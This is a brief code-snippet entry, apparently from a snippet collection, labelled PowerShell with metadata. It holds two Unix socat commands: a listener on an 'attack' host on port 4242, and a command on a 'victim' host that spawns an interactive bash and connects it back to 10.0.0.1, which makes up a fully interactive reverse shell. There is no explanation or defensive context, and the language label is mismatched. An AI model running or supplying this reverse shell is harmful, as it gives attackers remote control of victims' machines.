---
id: dd3a2f4e-59f9-4cf9-b3c2-62fb54b5c8a1
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.199079+00:00'
updated_at: '2023-04-10T20:25:32.756749+00:00'
---

# Code Snippet dd3a2f4e

**Language**: Powershell

```powershell
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```


